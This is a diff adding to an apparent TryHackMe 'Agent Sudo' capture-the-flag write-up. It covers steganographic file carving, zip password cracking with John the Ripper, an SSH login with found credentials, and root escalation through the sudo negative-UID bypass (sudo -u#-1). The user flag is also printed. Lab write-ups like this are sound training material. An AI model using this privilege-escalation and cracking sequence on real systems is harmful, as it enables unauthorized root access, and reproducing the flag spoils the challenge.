@@ -235,14 +235,130 @@ Hi james,
 
 Your login password is hackerrules!
 ```
+Extracting hidden data from Cutie.png
 
----
+### Command Used
+```bash
+dd if=cutie.png of=hidden.zip bs=1 skip=34562
+```
+### Convert Zip to hash to crack
+```bash
+zip2john hidden.zip > hash.txt
+```
 
-### Conclusion
+### Crack the hash
+```bash
+sudo john hash.txt --wordlist=/usr/share/seclists/rockyou.txt
+```
+### Unzip the hidden.zip
+```bash
+7z x hidden.zip
+```
+
+- You will see **To_agentR.txt** File.
+
+### To_agentR.txt
+```ansi
+┌─[zeref@Athena]─[~/TryHackMe/Agent-Sudo]─[192.168.137.158]
+└──╼ $ cat To_agentR.txt 
+Agent C,
+
+We need to send the picture to 'QXJlYTUx' as soon as possible!
+
+By,
+Agent R
+```
+
+### Brake the Cipher from CyberChef
+
+![CyberChef](screenshots/4.png)
+
+- Pass is Area51 (for Steg) 
+
+### Conclusionssh james@10.48.159.105
 
 Credentials discovered:
 - Username: `james`
 - Password: `hackerrules`
 
 These credentials can be used to gain SSH access to the target system.
+
+## Initial Shell
+```bash
+ssh james@10.48.159.105
 ```
+## Post Exploitation Enumeration
+
+- We found user flag
+```bash
+b03d975e8c92a7c04146cfa7a5a313c7
+```
+- We also get **Alien_autospy.jpg** in james user folder transfer it to your Own system
+
+### Command to Download the Files
+```bash
+sudo scp james@10.48.141.78:/home/james/Alien_autospy.jpg .
+```
+- Its a Normal image we have to revere the image and look for the Foxnews article.
+
+![Area51](screenshots/3.png)
+
+![Foxnews](screenshots/5.png)
+
+- Incident name is **Roswell alien autopsy**
+
+## Privilege Escalation
+
+### Checking Sudo Permissions
+
+```bash
+sudo -l
+```
+
+### Observation
+
+The user `james` is allowed to run `/bin/bash` as any user except root:
+
+```
+(ALL, !root) /bin/bash
+```
+
+---
+
+### Analysis
+
+Although root execution is restricted, this can be bypassed using a negative UID, which maps to root.
+
+---
+
+### Exploitation
+
+```bash
+sudo -u#-1 /bin/bash 
+```
+- **Source** https://www.exploit-db.com/exploits/47502
+
+### Result
+
+```bash
+whoami
+root
+```
+
+---
+
+## Root Flag
+
+```bash
+cat /root/root.txt
+```
+## Learnings
+
+- HTTP headers can be manipulated to bypass access controls  
+- Weak passwords are vulnerable to brute-force attacks  
+- Steganography can hide sensitive data in multiple formats (JPG, PNG)  
+- Manual file carving is useful when automated tools fail  
+- Encoded data (Base64) can reveal critical information  
+- Misconfigured sudo permissions can lead to full system compromise  
+
+# Thanks For Reading | Creator Zeref0xD
